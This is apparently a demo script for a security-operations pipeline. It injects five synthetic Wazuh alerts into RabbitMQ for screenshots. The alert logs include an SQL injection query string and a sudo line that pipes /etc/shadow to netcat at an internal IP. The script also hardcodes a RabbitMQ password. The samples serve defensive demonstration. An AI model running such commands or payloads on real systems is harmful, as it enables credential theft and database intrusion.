#!/usr/bin/env python3
"""Inject a curated set of realistic Wazuh alerts into RabbitMQ for demo screenshots.

Uses the RabbitMQ Management HTTP API (port 15672) to publish WazuhLog-shaped JSON
to the aegis.alerts exchange (routing key alert.raw) so the full pipeline
(SLM triage → LLM analysis → risk scoring → SOAR) processes them.

5 alerts chosen for visual variety:
  1. SSH brute force (rule 5712, level 10)
  2. SQL injection via web (rule 31103, level 7)
  3. Privilege escalation — sudo abuse (rule 5401, level 5)
  4. Lateral movement — Pass-the-Hash (rule 92652, level 12)
  5. Ransomware indicator — mass file rename (rule 550, level 10)
"""

from __future__ import annotations

import base64
import json
import time
import urllib.error
import urllib.request
from datetime import UTC, datetime
from uuid import uuid4

RABBITMQ_MGMT = "http://localhost:15672"
RABBITMQ_USER = "aegis"
RABBITMQ_PASSWORD = "AeG!s_Rmq_2026_K9vT4pL7xQ2m"
RABBITMQ_VHOST = "aegis"
EXCHANGE = "aegis.alerts"
ROUTING_KEY = "alert.raw"

ALERTS = [
    {
        "id": str(uuid4()),
        "timestamp": datetime.now(UTC).isoformat(),
        "source_agent": "SRV-PROD-01",
        "source_ip": "127.0.0.1",
        "attacker_ip": "185.220.101.42",
        "rule_id": 5712,
        "rule_level": 10,
        "rule_description": "SSHD brute force trying to get access to the system",
        "full_log": (
            "Jun 24 23:52:01 SRV-PROD-01 sshd[4821]: Failed password for root from "
            "185.220.101.42 port 48922 ssh2 (attempt 47 of 50)"
        ),
        "mitre_technique": "T1110.001",
        "decoder_name": "sshd",
    },
    {
        "id": str(uuid4()),
        "timestamp": datetime.now(UTC).isoformat(),
        "source_agent": "SRV-PROD-01",
        "source_ip": "127.0.0.1",
        "attacker_ip": "10.0.2.77",
        "rule_id": 31103,
        "rule_level": 7,
        "rule_description": "SQL injection attempt detected in web request",
        "full_log": (
            '10.0.2.77 - - [24/Jun/2026:23:53:12 +0000] '
            '"GET /rest/products/search?q=test%27%20UNION%20SELECT%20'
            'username,password%20FROM%20Users-- HTTP/1.1" 200 4832 '
            '"-" "sqlmap/1.8.3"'
        ),
        "mitre_technique": "T1190",
        "decoder_name": "web-accesslog",
    },
    {
        "id": str(uuid4()),
        "timestamp": datetime.now(UTC).isoformat(),
        "source_agent": "SRV-PROD-01",
        "source_ip": "127.0.0.1",
        "attacker_ip": None,
        "rule_id": 5401,
        "rule_level": 5,
        "rule_description": "Unauthorized sudo command executed by non-privileged user",
        "full_log": (
            "Jun 24 23:54:30 SRV-PROD-01 sudo: operator : "
            "command not allowed ; TTY=pts/2 ; PWD=/tmp ; "
            "USER=root ; COMMAND=/bin/bash -c 'cat /etc/shadow | "
            "nc 10.0.2.77 4444'"
        ),
        "mitre_technique": "T1548.003",
        "decoder_name": "sudo",
    },
    {
        "id": str(uuid4()),
        "timestamp": datetime.now(UTC).isoformat(),
        "source_agent": "SRV-PROD-01",
        "source_ip": "127.0.0.1",
        "attacker_ip": "10.0.2.77",
        "rule_id": 92652,
        "rule_level": 12,
        "rule_description": "Pass-the-Hash authentication detected via NTLM relay",
        "full_log": (
            "Jun 24 23:55:45 SRV-PROD-01 winlogbeat: EventID=4624 "
            "LogonType=9 TargetUserName=Administrator "
            "IpAddress=10.0.2.77 AuthPackage=NTLM "
            "LogonProcess=seclogo KeyLength=0 "
            "LmPackageName=NTLM V1 ImpersonationLevel=Delegation"
        ),
        "mitre_technique": "T1550.002",
        "decoder_name": "windows-eventlog",
    },
    {
        "id": str(uuid4()),
        "timestamp": datetime.now(UTC).isoformat(),
        "source_agent": "SRV-PROD-01",
        "source_ip": "127.0.0.1",
        "attacker_ip": None,
        "rule_id": 550,
        "rule_level": 10,
        "rule_description": "Possible ransomware activity — mass file extension change detected",
        "full_log": (
            "Jun 24 23:56:22 SRV-PROD-01 ossec-syscheckd: "
            "Alert: File '/data/production/orders_2026.xlsx' "
            "renamed to '/data/production/orders_2026.xlsx.locked' "
            "(148 similar changes in last 30 seconds across /data/production/)"
        ),
        "mitre_technique": "T1486",
        "decoder_name": "syscheck_new_entry",
    },
]


def publish_via_api(alert: dict[str, object]) -> bool:
    """Publish one message via RabbitMQ Management HTTP API."""
    url = f"{RABBITMQ_MGMT}/api/exchanges/{RABBITMQ_VHOST}/{EXCHANGE}/publish"
    payload = json.dumps({
        "properties": {"content_type": "application/json"},
        "routing_key": ROUTING_KEY,
        "payload": json.dumps(alert),
        "payload_encoding": "string",
    }).encode()

    token = base64.b64encode(f"{RABBITMQ_USER}:{RABBITMQ_PASSWORD}".encode()).decode()
    req = urllib.request.Request(url, data=payload, method="POST")
    req.add_header("Authorization", f"Basic {token}")
    req.add_header("Content-Type", "application/json")

    try:
        resp = urllib.request.urlopen(req, timeout=5)
        result = json.loads(resp.read())
        return result.get("routed", False)
    except urllib.error.URLError as exc:
        print(f"  ERROR: {exc}")
        return False


def main() -> None:
    print("Injecting 5 demo alerts via RabbitMQ Management API...\n")
    for i, alert in enumerate(ALERTS, 1):
        ok = publish_via_api(alert)
        status = "OK" if ok else "FAILED"
        print(f"  [{i}/5] {status} — rule {alert['rule_id']} lvl {alert['rule_level']}: "
              f"{alert['rule_description']}")
        if i < len(ALERTS):
            time.sleep(2)

    print("\nDone. Monitor with: docker logs aegis-node1-middleware-1 -f")
    print("Reports will appear as 'report_generated' events in the logs.")


if __name__ == "__main__":
    main()
